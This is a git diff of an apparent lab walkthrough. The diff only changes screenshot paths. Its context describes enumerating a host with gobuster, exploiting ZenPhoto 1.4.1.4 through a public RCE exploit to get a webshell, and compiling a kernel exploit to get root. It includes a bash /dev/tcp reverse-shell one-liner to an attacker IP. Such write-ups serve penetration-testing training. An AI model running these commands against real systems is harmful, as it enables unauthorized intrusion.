@@ -23,7 +23,7 @@ Of all things, Telnet is open.&#x20;
 
 Port 80 just shows this:
 
-<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
 
 A `gobuster` scan reveals the following directories:
 
@@ -49,11 +49,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 Visiting `/test` reveals a ZenPhoto instance:
 
-<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
 
 Viewing the page source reveals the version of ZenPhoto that is running:
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
 
 There are RCE exploits available for this instance:
 
@@ -68,7 +68,7 @@ ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Ex | php/webapps/18083.p
 
 This exploits works in getting me a webshell:
 
-<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
 
 We can get a reverse shell using this one-liner:
 
@@ -76,7 +76,7 @@ We can get a reverse shell using this one-liner:
 bash -c 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -95,6 +95,6 @@ There are quite a few exploits that might work for this version of Linux running
 
 Compile it on the machine itself using `gcc exploit.c -o exploit`. Then, run it to get a `root` shell:
 
-<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
